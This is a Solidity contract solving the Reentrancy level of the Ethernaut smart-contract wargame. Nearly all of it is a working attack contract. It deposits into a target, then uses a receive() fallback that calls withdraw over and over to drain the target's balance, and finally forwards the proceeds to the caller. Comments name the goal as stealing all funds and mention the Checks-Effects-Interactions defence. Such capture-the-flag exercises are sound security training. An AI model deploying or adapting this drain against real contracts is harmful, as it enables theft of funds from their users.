// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

/**
 * @title 10. REENTRANCY
 * @dev Steal all the funds from the contract.
 */

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

// Always follow the Checks-Effects-Interactions pattern
// Never change any states after an external call
contract Ethernaut_Reentrancy {
    address private target = 0x1b625D92F3E42303AbbE7F697E29e035BB6B829F; // Replace with your Reentrance instance
    uint256 donation = 1000000 gwei;

    // 1. Start by donating to the target contract so you have some funds to withdraw
    function donate() public payable {
        IReentrance(target).donate{value: msg.value}(address(this));
    }

    // 2. Call the withdraw function
    function attack() public payable {
        IReentrance(target).withdraw(donation);
    }

    // the fallback will take care of the reentrancy attack
    receive() external payable {
        if (target.balance >= donation) {
            IReentrance(target).withdraw(donation);
        }
    }

    // Allows to withdraw the funds from the contract after the attack
    function withdraw() public {
        uint256 bal = address(this).balance;
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "Transfer Failed");
    }
}

// 🎉 Level completed! 🎉
